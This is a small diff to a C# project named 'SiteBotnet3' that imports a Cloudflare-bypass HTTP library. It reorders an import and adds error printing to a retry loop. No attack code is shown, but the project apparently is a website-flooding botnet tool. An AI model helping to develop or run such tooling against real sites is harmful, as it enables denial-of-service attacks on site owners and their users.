@@ -2,9 +2,9 @@
 using System.Collections.Generic;
 using Leaf.xNet;
 using Leaf.xNet.Services.Cloudflare;
-using System.Net.NetworkInformation;
 using System.Threading;
 using SiteBotnet3.Utils;
+using System.Net.NetworkInformation;
 
 namespace SiteBotnet3
 {
@@ -98,7 +98,7 @@ namespace SiteBotnet3
                     Start(false);
                 }
             }
-            catch { goto request; }
+            catch (Exception ex) { Console.WriteLine("[!!!] ERROR [!!!] " + ex.Message); goto request; }
         }
     }
 }
